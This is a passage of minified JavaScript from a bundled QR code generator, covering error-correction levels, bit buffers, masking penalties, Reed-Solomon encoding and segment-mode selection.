      bit: 3
    },
    e.H = {
      bit: 2
    };
  function t(n) {
    if (typeof n != "string")
      throw new Error("Param is not a string");
    switch (n.toLowerCase()) {
      case "l":
      case "low":
        return e.L;
      case "m":
      case "medium":
        return e.M;
      case "q":
      case "quartile":
        return e.Q;
      case "h":
      case "high":
        return e.H;
      default:
        throw new Error("Unknown EC Level: " + n)
    }
  }
  e.isValid = function (r) {
    return r && typeof r.bit < "u" && r.bit >= 0 && r.bit < 4
  }
    ,
    e.from = function (r, s) {
      if (e.isValid(r))
        return r;
      try {
        return t(r)
      } catch {
        return s
      }
    }
}
)(Jl);
function Ux() {
  this.buffer = [],
    this.length = 0
}
Ux.prototype = {
  get: function (e) {
    const t = Math.floor(e / 8);
    return (this.buffer[t] >>> 7 - e % 8 & 1) === 1
  },
  put: function (e, t) {
    for (let n = 0; n < t; n++)
      this.putBit((e >>> t - n - 1 & 1) === 1)
  },
  getLengthInBits: function () {
    return this.length
  },
  putBit: function (e) {
    const t = Math.floor(this.length / 8);
    this.buffer.length <= t && this.buffer.push(0),
      e && (this.buffer[t] |= 128 >>> this.length % 8),
      this.length++
  }
};
var t3 = Ux;
function Li(e) {
  if (!e || e < 1)
    throw new Error("BitMatrix size must be defined and greater than 0");
  this.size = e,
    this.data = new Uint8Array(e * e),
    this.reservedBit = new Uint8Array(e * e)
}
Li.prototype.set = function (e, t, n, r) {
  const s = e * this.size + t;
  this.data[s] = n,
    r && (this.reservedBit[s] = !0)
}
  ;
Li.prototype.get = function (e, t) {
  return this.data[e * this.size + t]
}
  ;
Li.prototype.xor = function (e, t, n) {
  this.data[e * this.size + t] ^= n
}
  ;
Li.prototype.isReserved = function (e, t) {
  return this.reservedBit[e * this.size + t]
}
  ;
var n3 = Li
  , $x = {};
(function (e) {
  const t = Tt.getSymbolSize;
  e.getRowColCoords = function (r) {
    if (r === 1)
      return [];
    const s = Math.floor(r / 7) + 2
      , o = t(r)
      , i = o === 145 ? 26 : Math.ceil((o - 13) / (2 * s - 2)) * 2
      , l = [o - 7];
    for (let c = 1; c < s - 1; c++)
      l[c] = l[c - 1] - i;
    return l.push(6),
      l.reverse()
  }
    ,
    e.getPositions = function (r) {
      const s = []
        , o = e.getRowColCoords(r)
        , i = o.length;
      for (let l = 0; l < i; l++)
        for (let c = 0; c < i; c++)
          l === 0 && c === 0 || l === 0 && c === i - 1 || l === i - 1 && c === 0 || s.push([o[l], o[c]]);
      return s
    }
}
)($x);
var Hx = {};
const r3 = Tt.getSymbolSize
  , Ap = 7;
Hx.getPositions = function (t) {
  const n = r3(t);
  return [[0, 0], [n - Ap, 0], [0, n - Ap]]
}
  ;
var Wx = {};
(function (e) {
  e.Patterns = {
    PATTERN000: 0,
    PATTERN001: 1,
    PATTERN010: 2,
    PATTERN011: 3,
    PATTERN100: 4,
    PATTERN101: 5,
    PATTERN110: 6,
    PATTERN111: 7
  };
  const t = {
    N1: 3,
    N2: 3,
    N3: 40,
    N4: 10
  };
  e.isValid = function (s) {
    return s != null && s !== "" && !isNaN(s) && s >= 0 && s <= 7
  }
    ,
    e.from = function (s) {
      return e.isValid(s) ? parseInt(s, 10) : void 0
    }
    ,
    e.getPenaltyN1 = function (s) {
      const o = s.size;
      let i = 0
        , l = 0
        , c = 0
        , u = null
        , d = null;
      for (let f = 0; f < o; f++) {
        l = c = 0,
          u = d = null;
        for (let h = 0; h < o; h++) {
          let y = s.get(f, h);
          y === u ? l++ : (l >= 5 && (i += t.N1 + (l - 5)),
            u = y,
            l = 1),
            y = s.get(h, f),
            y === d ? c++ : (c >= 5 && (i += t.N1 + (c - 5)),
              d = y,
              c = 1)
        }
        l >= 5 && (i += t.N1 + (l - 5)),
          c >= 5 && (i += t.N1 + (c - 5))
      }
      return i
    }
    ,
    e.getPenaltyN2 = function (s) {
      const o = s.size;
      let i = 0;
      for (let l = 0; l < o - 1; l++)
        for (let c = 0; c < o - 1; c++) {
          const u = s.get(l, c) + s.get(l, c + 1) + s.get(l + 1, c) + s.get(l + 1, c + 1);
          (u === 4 || u === 0) && i++
        }
      return i * t.N2
    }
    ,
    e.getPenaltyN3 = function (s) {
      const o = s.size;
      let i = 0
        , l = 0
        , c = 0;
      for (let u = 0; u < o; u++) {
        l = c = 0;
        for (let d = 0; d < o; d++)
          l = l << 1 & 2047 | s.get(u, d),
            d >= 10 && (l === 1488 || l === 93) && i++,
            c = c << 1 & 2047 | s.get(d, u),
            d >= 10 && (c === 1488 || c === 93) && i++
      }
      return i * t.N3
    }
    ,
    e.getPenaltyN4 = function (s) {
      let o = 0;
      const i = s.data.length;
      for (let c = 0; c < i; c++)
        o += s.data[c];
      return Math.abs(Math.ceil(o * 100 / i / 5) - 10) * t.N4
    }
    ;
  function n(r, s, o) {
    switch (r) {
      case e.Patterns.PATTERN000:
        return (s + o) % 2 === 0;
      case e.Patterns.PATTERN001:
        return s % 2 === 0;
      case e.Patterns.PATTERN010:
        return o % 3 === 0;
      case e.Patterns.PATTERN011:
        return (s + o) % 3 === 0;
      case e.Patterns.PATTERN100:
        return (Math.floor(s / 2) + Math.floor(o / 3)) % 2 === 0;
      case e.Patterns.PATTERN101:
        return s * o % 2 + s * o % 3 === 0;
      case e.Patterns.PATTERN110:
        return (s * o % 2 + s * o % 3) % 2 === 0;
      case e.Patterns.PATTERN111:
        return (s * o % 3 + (s + o) % 2) % 2 === 0;
      default:
        throw new Error("bad maskPattern:" + r)
    }
  }
  e.applyMask = function (s, o) {
    const i = o.size;
    for (let l = 0; l < i; l++)
      for (let c = 0; c < i; c++)
        o.isReserved(c, l) || o.xor(c, l, n(s, c, l))
  }
    ,
    e.getBestMask = function (s, o) {
      const i = Object.keys(e.Patterns).length;
      let l = 0
        , c = 1 / 0;
      for (let u = 0; u < i; u++) {
        o(u),
          e.applyMask(u, s);
        const d = e.getPenaltyN1(s) + e.getPenaltyN2(s) + e.getPenaltyN3(s) + e.getPenaltyN4(s);
        e.applyMask(u, s),
          d < c && (c = d,
            l = u)
      }
      return l
    }
}
)(Wx);
var Zl = {};
const ur = Jl
  , ga = [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 2, 2, 1, 2, 2, 4, 1, 2, 4, 4, 2, 4, 4, 4, 2, 4, 6, 5, 2, 4, 6, 6, 2, 5, 8, 8, 4, 5, 8, 8, 4, 5, 8, 11, 4, 8, 10, 11, 4, 9, 12, 16, 4, 9, 16, 16, 6, 10, 12, 18, 6, 10, 17, 16, 6, 11, 16, 19, 6, 13, 18, 21, 7, 14, 21, 25, 8, 16, 20, 25, 8, 17, 23, 25, 9, 17, 23, 34, 9, 18, 25, 30, 10, 20, 27, 32, 12, 21, 29, 35, 12, 23, 34, 37, 12, 25, 34, 40, 13, 26, 35, 42, 14, 28, 38, 45, 15, 29, 40, 48, 16, 31, 43, 51, 17, 33, 45, 54, 18, 35, 48, 57, 19, 37, 51, 60, 19, 38, 53, 63, 20, 40, 56, 66, 21, 43, 59, 70, 22, 45, 62, 74, 24, 47, 65, 77, 25, 49, 68, 81]
  , ya = [7, 10, 13, 17, 10, 16, 22, 28, 15, 26, 36, 44, 20, 36, 52, 64, 26, 48, 72, 88, 36, 64, 96, 112, 40, 72, 108, 130, 48, 88, 132, 156, 60, 110, 160, 192, 72, 130, 192, 224, 80, 150, 224, 264, 96, 176, 260, 308, 104, 198, 288, 352, 120, 216, 320, 384, 132, 240, 360, 432, 144, 280, 408, 480, 168, 308, 448, 532, 180, 338, 504, 588, 196, 364, 546, 650, 224, 416, 600, 700, 224, 442, 644, 750, 252, 476, 690, 816, 270, 504, 750, 900, 300, 560, 810, 960, 312, 588, 870, 1050, 336, 644, 952, 1110, 360, 700, 1020, 1200, 390, 728, 1050, 1260, 420, 784, 1140, 1350, 450, 812, 1200, 1440, 480, 868, 1290, 1530, 510, 924, 1350, 1620, 540, 980, 1440, 1710, 570, 1036, 1530, 1800, 570, 1064, 1590, 1890, 600, 1120, 1680, 1980, 630, 1204, 1770, 2100, 660, 1260, 1860, 2220, 720, 1316, 1950, 2310, 750, 1372, 2040, 2430];
Zl.getBlocksCount = function (t, n) {
  switch (n) {
    case ur.L:
      return ga[(t - 1) * 4 + 0];
    case ur.M:
      return ga[(t - 1) * 4 + 1];
    case ur.Q:
      return ga[(t - 1) * 4 + 2];
    case ur.H:
      return ga[(t - 1) * 4 + 3];
    default:
      return
  }
}
  ;
Zl.getTotalCodewordsCount = function (t, n) {
  switch (n) {
    case ur.L:
      return ya[(t - 1) * 4 + 0];
    case ur.M:
      return ya[(t - 1) * 4 + 1];
    case ur.Q:
      return ya[(t - 1) * 4 + 2];
    case ur.H:
      return ya[(t - 1) * 4 + 3];
    default:
      return
  }
}
  ;
var Qx = {}
  , ec = {};
const Yo = new Uint8Array(512)
  , gl = new Uint8Array(256);
(function () {
  let t = 1;
  for (let n = 0; n < 255; n++)
    Yo[n] = t,
      gl[t] = n,
      t <<= 1,
      t & 256 && (t ^= 285);
  for (let n = 255; n < 512; n++)
    Yo[n] = Yo[n - 255]
}
)();
ec.log = function (t) {
  if (t < 1)
    throw new Error("log(" + t + ")");
  return gl[t]
}
  ;
ec.exp = function (t) {
  return Yo[t]
}
  ;
ec.mul = function (t, n) {
  return t === 0 || n === 0 ? 0 : Yo[gl[t] + gl[n]]
}
  ;
(function (e) {
  const t = ec;
  e.mul = function (r, s) {
    const o = new Uint8Array(r.length + s.length - 1);
    for (let i = 0; i < r.length; i++)
      for (let l = 0; l < s.length; l++)
        o[i + l] ^= t.mul(r[i], s[l]);
    return o
  }
    ,
    e.mod = function (r, s) {
      let o = new Uint8Array(r);
      for (; o.length - s.length >= 0;) {
        const i = o[0];
        for (let c = 0; c < s.length; c++)
          o[c] ^= t.mul(s[c], i);
        let l = 0;
        for (; l < o.length && o[l] === 0;)
          l++;
        o = o.slice(l)
      }
      return o
    }
    ,
    e.generateECPolynomial = function (r) {
      let s = new Uint8Array([1]);
      for (let o = 0; o < r; o++)
        s = e.mul(s, new Uint8Array([1, t.exp(o)]));
      return s
    }
}
)(Qx);
const qx = Qx;
function Yf(e) {
  this.genPoly = void 0,
    this.degree = e,
    this.degree && this.initialize(this.degree)
}
Yf.prototype.initialize = function (t) {
  this.degree = t,
    this.genPoly = qx.generateECPolynomial(this.degree)
}
  ;
Yf.prototype.encode = function (t) {
  if (!this.genPoly)
    throw new Error("Encoder not initialized");
  const n = new Uint8Array(t.length + this.degree);
  n.set(t);
  const r = qx.mod(n, this.genPoly)
    , s = this.degree - r.length;
  if (s > 0) {
    const o = new Uint8Array(this.degree);
    return o.set(r, s),
      o
  }
  return r
}
  ;
var s3 = Yf
  , Gx = {}
  , Er = {}
  , Xf = {};
Xf.isValid = function (t) {
  return !isNaN(t) && t >= 1 && t <= 40
}
  ;
var vn = {};
const Kx = "[0-9]+"
  , o3 = "[A-Z $%*+\\-./:]+";
let Si = "(?:[u3000-u303F]|[u3040-u309F]|[u30A0-u30FF]|[uFF00-uFFEF]|[u4E00-u9FAF]|[u2605-u2606]|[u2190-u2195]|u203B|[u2010u2015u2018u2019u2025u2026u201Cu201Du2225u2260]|[u0391-u0451]|[u00A7u00A8u00B1u00B4u00D7u00F7])+";
Si = Si.replace(/u/g, "\\u");
const i3 = "(?:(?![A-Z0-9 $%*+\\-./:]|" + Si + `)(?:.|[\r
]))+`;
vn.KANJI = new RegExp(Si, "g");
vn.BYTE_KANJI = new RegExp("[^A-Z0-9 $%*+\\-./:]+", "g");
vn.BYTE = new RegExp(i3, "g");
vn.NUMERIC = new RegExp(Kx, "g");
vn.ALPHANUMERIC = new RegExp(o3, "g");
const a3 = new RegExp("^" + Si + "$")
  , l3 = new RegExp("^" + Kx + "$")
  , c3 = new RegExp("^[A-Z0-9 $%*+\\-./:]+$");
vn.testKanji = function (t) {
  return a3.test(t)
}
  ;
vn.testNumeric = function (t) {
  return l3.test(t)
}
  ;
vn.testAlphanumeric = function (t) {
  return c3.test(t)
}
  ;
(function (e) {
  const t = Xf
    , n = vn;
  e.NUMERIC = {
    id: "Numeric",
    bit: 1,
    ccBits: [10, 12, 14]
  },
    e.ALPHANUMERIC = {
      id: "Alphanumeric",
      bit: 2,
      ccBits: [9, 11, 13]
    },
    e.BYTE = {
      id: "Byte",
      bit: 4,
      ccBits: [8, 16, 16]
    },
    e.KANJI = {
      id: "Kanji",
      bit: 8,
      ccBits: [8, 10, 12]
    },
    e.MIXED = {
      bit: -1
    },
    e.getCharCountIndicator = function (o, i) {
      if (!o.ccBits)
        throw new Error("Invalid mode: " + o);
      if (!t.isValid(i))
        throw new Error("Invalid version: " + i);
      return i >= 1 && i < 10 ? o.ccBits[0] : i < 27 ? o.ccBits[1] : o.ccBits[2]
    }
    ,
    e.getBestModeForData = function (o) {
      return n.testNumeric(o) ? e.NUMERIC : n.testAlphanumeric(o) ? e.ALPHANUMERIC : n.testKanji(o) ? e.KANJI : e.BYTE
    }
    ,
    e.toString = function (o) {
      if (o && o.id)
        return o.id;
      throw new Error("Invalid mode")
    }
    ,
    e.isValid = function (o) {
      return o && o.bit && o.ccBits
    }
    ;
  function r(s) {
    if (typeof s != "string")
      throw new Error("Param is not a string");
    switch (s.toLowerCase()) {
      case "numeric":
        return e.NUMERIC;
      case "alphanumeric":
        return e.ALPHANUMERIC;
      case "kanji":
        return e.KANJI;
      case "byte":
        return e.BYTE;
      default:
        throw new Error("Unknown mode: " + s)
    }
  }
  e.from = function (o, i) {
    if (e.isValid(o))
      return o;
    try {
      return r(o)
    } catch {
      return i
    }
  }
}
)(Er);
(function (e) {
  const t = Tt
    , n = Zl
    , r = Jl
    , s = Er
    , o = Xf
    , i = 7973
    , l = t.getBCHDigit(i);
  function c(h, y, b) {
    for (let v = 1; v <= 40; v++)
      if (y <= e.getCapacity(v, b, h))
        return v
  }
  function u(h, y) {
    return s.getCharCountIndicator(h, y) + 4
  }
  function d(h, y) {
    let b = 0;
    return h.forEach(function (v) {
      const C = u(v.mode, y);
      b += C + v.getBitsLength()
    }),
      b
  }
  function f(h, y) {
    for (let b = 1; b <= 40; b++)
      if (d(h, b) <= e.getCapacity(b, y, s.MIXED))
        return b
  }
  e.from = function (y, b) {
    return o.isValid(y) ? parseInt(y, 10) : b
  }
    ,
    e.getCapacity = function (y, b, v) {
      if (!o.isValid(y))
        throw new Error("Invalid QR Code version");
      typeof v > "u" && (v = s.BYTE);
      const C = t.getSymbolTotalCodewords(y)
        , g = n.getTotalCodewordsCount(y, b)
        , m = (C - g) * 8;
      if (v === s.MIXED)
        return m;
      const p = m - u(v, y);
      switch (v) {
        case s.NUMERIC:
          return Math.floor(p / 10 * 3);
        case s.ALPHANUMERIC:
          return Math.floor(p / 11 * 2);
        case s.KANJI:
          return Math.floor(p / 13);
        case s.BYTE:
        default:
          return Math.floor(p / 8)
      }
    }
    ,
    e.getBestVersionForData = function (y, b) {
      let v;
      const C = r.from(b, r.M);
      if (Array.isArray(y)) {
        if (y.length > 1)
          return f(y, C);
        if (y.length === 0)
          return 1;
        v = y[0]
      } else
        v = y;
      return c(v.mode, v.getLength(), C)
    }
    ,
    e.getEncodedBits = function (y) {
      if (!o.isValid(y) || y < 7)
        throw new Error("Invalid QR Code version");
      let b = y << 12;
      for (; t.getBCHDigit(b) - l >= 0;)
        b ^= i << t.getBCHDigit(b) - l;
      return y << 12 | b
    }
}
)(Gx);
var Yx = {};
const wd = Tt
  , Xx = 1335
  , u3 = 21522
  , Ep = wd.getBCHDigit(Xx);
Yx.getEncodedBits = function (t, n) {
  const r = t.bit << 3 | n;
  let s = r << 10;
  for (; wd.getBCHDigit(s) - Ep >= 0;)
    s ^= Xx << wd.getBCHDigit(s) - Ep;
  return (r << 10 | s) ^ u3
}
  ;
var Jx = {};
const d3 = Er;
function Zs(e) {
  this.mode = d3.NUMERIC,
    this.data = e.toString()
}
Zs.getBitsLength = function (t) {
  return 10 * Math.floor(t / 3) + (t % 3 ? t % 3 * 3 + 1 : 0)
}
  ;
Zs.prototype.getLength = function () {
  return this.data.length
}
  ;
Zs.prototype.getBitsLength = function () {
  return Zs.getBitsLength(this.data.length)
}
  ;
Zs.prototype.write = function (t) {
  let n, r, s;
  for (n = 0; n + 3 <= this.data.length; n += 3)
    r = this.data.substr(n, 3),
      s = parseInt(r, 10),
      t.put(s, 10);
  const o = this.data.length - n;
  o > 0 && (r = this.data.substr(n),
    s = parseInt(r, 10),
    t.put(s, o * 3 + 1))
}
  ;
var f3 = Zs;
const h3 = Er
  , tu = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", " ", "$", "%", "*", "+", "-", ".", "/", ":"];
function eo(e) {
  this.mode = h3.ALPHANUMERIC,
    this.data = e
}
eo.getBitsLength = function (t) {
  return 11 * Math.floor(t / 2) + 6 * (t % 2)
}
  ;
eo.prototype.getLength = function () {
  return this.data.length
}
  ;
eo.prototype.getBitsLength = function () {
  return eo.getBitsLength(this.data.length)
}
  ;
eo.prototype.write = function (t) {
  let n;
  for (n = 0; n + 2 <= this.data.length; n += 2) {
    let r = tu.indexOf(this.data[n]) * 45;
    r += tu.indexOf(this.data[n + 1]),
      t.put(r, 11)
  }
  this.data.length % 2 && t.put(tu.indexOf(this.data[n]), 6)
}
  ;
var m3 = eo;
const p3 = Er;
function to(e) {
  this.mode = p3.BYTE,
    typeof e == "string" ? this.data = new TextEncoder().encode(e) : this.data = new Uint8Array(e)
}
to.getBitsLength = function (t) {
  return t * 8
}
  ;
to.prototype.getLength = function () {
  return this.data.length
}
  ;
to.prototype.getBitsLength = function () {
  return to.getBitsLength(this.data.length)
}
  ;
to.prototype.write = function (e) {
  for (let t = 0, n = this.data.length; t < n; t++)
    e.put(this.data[t], 8)
}
  ;
var g3 = to;
const y3 = Er
  , v3 = Tt;
function no(e) {
  this.mode = y3.KANJI,
    this.data = e
}
no.getBitsLength = function (t) {
  return t * 13
}
  ;
no.prototype.getLength = function () {
  return this.data.length
}
  ;
no.prototype.getBitsLength = function () {
  return no.getBitsLength(this.data.length)
}
  ;
no.prototype.write = function (e) {
  let t;
  for (t = 0; t < this.data.length; t++) {
    let n = v3.toSJIS(this.data[t]);
    if (n >= 33088 && n <= 40956)
      n -= 33088;
    else if (n >= 57408 && n <= 60351)
      n -= 49472;
    else
      throw new Error("Invalid SJIS character: " + this.data[t] + `
Make sure your charset is UTF-8`);
    n = (n >>> 8 & 255) * 192 + (n & 255),
      e.put(n, 13)
  }
}
  ;
var x3 = no
  , Zx = {
    exports: {}
  };
(function (e) {
  var t = {
    single_source_shortest_paths: function (n, r, s) {
      var o = {}
        , i = {};
      i[r] = 0;
      var l = t.PriorityQueue.make();
      l.push(r, 0);
      for (var c, u, d, f, h, y, b, v, C; !l.empty();) {
        c = l.pop(),
          u = c.value,
          f = c.cost,
          h = n[u] || {};
        for (d in h)
          h.hasOwnProperty(d) && (y = h[d],
            b = f + y,
            v = i[d],
            C = typeof i[d] > "u",
            (C || v > b) && (i[d] = b,
              l.push(d, b),
              o[d] = u))
      }
      if (typeof s < "u" && typeof i[s] > "u") {
        var g = ["Could not find a path from ", r, " to ", s, "."].join("");
        throw new Error(g)
      }
      return o
    },
    extract_shortest_path_from_predecessor_list: function (n, r) {
      for (var s = [], o = r; o;)
        s.push(o),
          n[o],
          o = n[o];
      return s.reverse(),
        s
    },
    find_path: function (n, r, s) {
      var o = t.single_source_shortest_paths(n, r, s);
      return t.extract_shortest_path_from_predecessor_list(o, s)
    },
    PriorityQueue: {
      make: function (n) {
        var r = t.PriorityQueue, s = {}, o;
        n = n || {};
        for (o in r)
          r.hasOwnProperty(o) && (s[o] = r[o]);
        return s.queue = [],
          s.sorter = n.sorter || r.default_sorter,
          s
      },
      default_sorter: function (n, r) {
        return n.cost - r.cost
      },
      push: function (n, r) {
        var s = {
          value: n,
          cost: r
        };
        this.queue.push(s),
          this.queue.sort(this.sorter)
      },
      pop: function () {
        return this.queue.shift()
      },
      empty: function () {
        return this.queue.length === 0
      }
    }
  };
  e.exports = t
}
)(Zx);
var w3 = Zx.exports;
(function (e) {
  const t = Er
    , n = f3
    , r = m3
    , s = g3
    , o = x3
    , i = vn
    , l = Tt
    , c = w3;
  function u(g) {
    return unescape(encodeURIComponent(g)).length
  }
  function d(g, m, p) {
    const w = [];
    let S;
    for (; (S = g.exec(p)) !== null;)
      w.push({
        data: S[0],
        index: S.index,
        mode: m,
        length: S[0].length
      });
    return w
  }
  function f(g) {
    const m = d(i.NUMERIC, t.NUMERIC, g)
      , p = d(i.ALPHANUMERIC, t.ALPHANUMERIC, g);
    let w, S;
    return l.isKanjiModeEnabled() ? (w = d(i.BYTE, t.BYTE, g),
      S = d(i.KANJI, t.KANJI, g)) : (w = d(i.BYTE_KANJI, t.BYTE, g),
        S = []),
      m.concat(p, w, S).sort(function (P, A) {
        return P.index - A.index
      }).map(function (P) {
        return {
          data: P.data,
          mode: P.mode,
          length: P.length
        }
      })
  }
  function h(g, m) {
    switch (m) {
      case t.NUMERIC:
        return n.getBitsLength(g);
      case t.ALPHANUMERIC:
        return r.getBitsLength(g);
      case t.KANJI:
        return o.getBitsLength(g);
      case t.BYTE:
        return s.getBitsLength(g)
    }
  }
  function y(g) {
    return g.reduce(function (m, p) {
      const w = m.length - 1 >= 0 ? m[m.length - 1] : null;
      return w && w.mode === p.mode ? (m[m.length - 1].data += p.data,
        m) : (m.push(p),
          m)
    }, [])
  }
  function b(g) {
    const m = [];
    for (let p = 0; p < g.length; p++) {
      const w = g[p];
      switch (w.mode) {
        case t.NUMERIC:
          m.push([w, {
            data: w.data,
            mode: t.ALPHANUMERIC,
            length: w.length
          }, {
              data: w.data,
              mode: t.BYTE,
              length: w.length
            }]);
          break;
        case t.ALPHANUMERIC:
          m.push([w, {
            data: w.data,
            mode: t.BYTE,
            length: w.length
          }]);
          break;
        case t.KANJI:
          m.push([w, {
            data: w.data,
            mode: t.BYTE,
            length: u(w.data)
          }]);
          break;
        case t.BYTE:
          m.push([{
            data: w.data,
            mode: t.BYTE,
            length: u(w.data)
          }])
      }
    }
    return m
  }
  function v(g, m) {
    const p = {}
      , w = {
        start: {}
      };
    let S = ["start"];
    for (let N = 0; N < g.length; N++) {
      const P = g[N]
        , A = [];
      for (let k = 0; k < P.length; k++) {
        const D = P[k]
          , q = "" + N + k;
        A.push(q),
          p[q] = {
            node: D,
            lastCount: 0
          },
          w[q] = {};
        for (let I = 0; I < S.length; I++) {
          const H = S[I];
          p[H] && p[H].node.mode === D.mode ? (w[H][q] = h(p[H].lastCount + D.length, D.mode) - h(p[H].lastCount, D.mode),
            p[H].lastCount += D.length) : (p[H] && (p[H].lastCount = D.length),
              w[H][q] = h(D.length, D.mode) + 4 + t.getCharCountIndicator(D.mode, m))
        }
      }
      S = A
    }
    for (let N = 0; N < S.length; N++)
      w[S[N]].end = 0;
    return {
      map: w,
      table: p
    }
  }
  function C(g, m) {
    let p;
    const w = t.getBestModeForData(g);
    if (p = t.from(m, w),
      p !== t.BYTE && p.bit < w.bit)
      throw new Error('"' + g + '" cannot be encoded with mode ' + t.toString(p) + `.
 Suggested mode is: ` + t.toString(w));
    switch (p === t.KANJI && !l.isKanjiModeEnabled() && (p = t.BYTE),
    p) {
      case t.NUMERIC:
        return new n(g);
      case t.ALPHANUMERIC:
        return new r(g);
      case t.KANJI:
        return new o(g);
      case t.BYTE:
        return new s(g)
    }
  }
  e.fromArray = function (m) {
    return m.reduce(function (p, w) {
      return typeof w == "string" ? p.push(C(w, null)) : w.data && p.push(C(w.data, w.mode)),
        p
    }, [])
  }
    ,
    e.fromString = function (m, p) {
      const w = f(m, l.isKanjiModeEnabled())
        , S = b(w)
        , N = v(S, p)
        , P = c.find_path(N.map, "start", "end")
        , A = [];
      for (let k = 1; k < P.length - 1; k++)
        A.push(N.table[P[k]].node);
      return e.fromArray(y(A))
    }
    ,
    e.rawSplit = function (m) {
      return e.fromArray(f(m, l.isKanjiModeEnabled()))
    }
}
)(Jx);
const tc = Tt
  , nu = Jl
  , b3 = t3
  , S3 = n3
  , C3 = $x
  , N3 = Hx
  , bd = Wx
  , Sd = Zl
  , j3 = s3
  , yl = Gx
  , P3 = Yx
  , A3 = Er
  , ru = Jx;
function E3(e, t) {
  const n = e.size
    , r = N3.getPositions(t);
  for (let s = 0; s < r.length; s++) {
    const o = r[s][0]
      , i = r[s][1];
    for (let l = -1; l <= 7; l++)
      if (!(o + l <= -1 || n <= o + l))
        for (let c = -1; c <= 7; c++)
          i + c <= -1 || n <= i + c || (l >= 0 && l <= 6 && (c === 0 || c === 6) || c >= 0 && c <= 6 && (l === 0 || l === 6) || l >= 2 && l <= 4 && c >= 2 && c <= 4 ? e.set(o + l, i + c, !0, !0) : e.set(o + l, i + c, !1, !0))
  }
}
function T3(e) {
  const t = e.size;
  for (let n = 8; n < t - 8; n++) {
    const r = n % 2 === 0;
    e.set(n, 6, r, !0),
      e.set(6, n, r, !0)
  }
}
function k3(e, t) {
  const n = C3.getPositions(t);
  for (let r = 0; r < n.length; r++) {
    const s = n[r][0]
      , o = n[r][1];
    for (let i = -2; i <= 2; i++)
      for (let l = -2; l <= 2; l++)
        i === -2 || i === 2 || l === -2 || l === 2 || i === 0 && l === 0 ? e.set(s + i, o + l, !0, !0) : e.set(s + i, o + l, !1, !0)
  }
}
function D3(e, t) {
  const n = e.size
    , r = yl.getEncodedBits(t);
  let s, o, i;
  for (let l = 0; l < 18; l++)
    s = Math.floor(l / 3),
      o = l % 3 + n - 8 - 3,
      i = (r >> l & 1) === 1,
      e.set(s, o, i, !0),
      e.set(o, s, i, !0)
}
function su(e, t, n) {
  const r = e.size
    , s = P3.getEncodedBits(t, n);
  let o, i;
  for (o = 0; o < 15; o++)
    i = (s >> o & 1) === 1,
      o < 6 ? e.set(o, 8, i, !0) : o < 8 ? e.set(o + 1, 8, i, !0) : e.set(r - 15 + o, 8, i, !0),
      o < 8 ? e.set(8, r - o - 1, i, !0) : o < 9 ? e.set(8, 15 - o - 1 + 1, i, !0) : e.set(8, 15 - o - 1, i, !0);
  e.set(r - 8, 8, 1, !0)
}
function M3(e, t) {
  const n = e.size;
  let r = -1
    , s = n - 1
    , o = 7
    , i = 0;
  for (let l = n - 1; l > 0; l -= 2)
    for (l === 6 && l--; ;) {
      for (let c = 0; c < 2; c++)
        if (!e.isReserved(s, l - c)) {
          let u = !1;
          i < t.length && (u = (t[i] >>> o & 1) === 1),
            e.set(s, l - c, u),
            o--,
            o === -1 && (i++,
              o = 7)
        }
      if (s += r,
        s < 0 || n <= s) {
        s -= r,
          r = -r;
        break
      }
    }
}
function R3(e, t, n) {
  const r = new b3;
  n.forEach(function (c) {
    r.put(c.mode.bit, 4),
      r.put(c.getLength(), A3.getCharCountIndicator(c.mode, e)),
      c.write(r)
  });
  const s = tc.getSymbolTotalCodewords(e)
    , o = Sd.getTotalCodewordsCount(e, t)
    , i = (s - o) * 8;
  for (r.getLengthInBits() + 4 <= i && r.put(0, 4); r.getLengthInBits() % 8 !== 0;)
    r.putBit(0);
  const l = (i - r.getLengthInBits()) / 8;
  for (let c = 0; c < l; c++)
    r.put(c % 2 ? 17 : 236, 8);
  return O3(r, e, t)
}
function O3(e, t, n) {
  const r = tc.getSymbolTotalCodewords(t)
    , s = Sd.getTotalCodewordsCount(t, n)
    , o = r - s
    , i = Sd.getBlocksCount(t, n)
    , l = r % i
    , c = i - l
    , u = Math.floor(r / i)
    , d = Math.floor(o / i)
    , f = d + 1
    , h = u - d
    , y = new j3(h);
  let b = 0;
  const v = new Array(i)
    , C = new Array(i);
  let g = 0;
  const m = new Uint8Array(e.buffer);
  for (let P = 0; P < i; P++) {
    const A = P < c ? d : f;
    v[P] = m.slice(b, b + A),
      C[P] = y.encode(v[P]),
      b += A,
      g = Math.max(g, A)
  }
  const p = new Uint8Array(r);
  let w = 0, S, N;
  for (S = 0; S < g; S++)
    for (N = 0; N < i; N++)
      S < v[N].length && (p[w++] = v[N][S]);
  for (S = 0; S < h; S++)
    for (N = 0; N < i; N++)
      p[w++] = C[N][S];
  return p
}
function I3(e, t, n, r) {
  let s;
  if (Array.isArray(e))
    s = ru.fromArray(e);
  else if (typeof e == "string") {
    let u = t;
    if (!u) {
      const d = ru.rawSplit(e);
      u = yl.getBestVersionForData(d, n)
    }
    s = ru.fromString(e, u || 40)
  } else
    throw new Error("Invalid data");
  const o = yl.getBestVersionForData(s, n);
  if (!o)
    throw new Error("The amount of data is too big to be stored in a QR Code");
  if (!t)
    t = o;
  else if (t < o)
    throw new Error(`
The chosen QR Code version cannot contain this amount of data.
Minimum version required to store current data is: ` + o + `.
`);
  const i = R3(t, n, s)
    , l = tc.getSymbolSize(t)
    , c = new S3(l);
  return E3(c, t),
    T3(c),
    k3(c, t),
    su(c, n, 0),
    t >= 7 && D3(c, t),
    M3(c, i),
    isNaN(r) && (r = bd.getBestMask(c, su.bind(null, c, n))),
    bd.applyMask(r, c),
    su(c, n, r),
  {
    modules: c,
    version: t,
    errorCorrectionLevel: n,
    maskPattern: r,
    segments: s
  }
}
zx.create = function (t, n) {
  if (typeof t > "u" || t === "")
    throw new Error("No input text");
  let r = nu.M, s, o;
  return typeof n < "u" && (r = nu.from(n.errorCorrectionLevel, nu.M),
    s = yl.from(n.version),
    o = bd.from(n.maskPattern),
    n.toSJISFunc && tc.setToSJISFunction(n.toSJISFunc)),
    I3(t, s, r, o)
}
  ;
var e1 = {}
  , Jf = {};
(function (e) {
  function t(n) {
    if (typeof n == "number" && (n = n.toString()),
      typeof n != "string")
      throw new Error("Color should be defined as hex string");
    let r = n.slice().replace("#", "").split("");
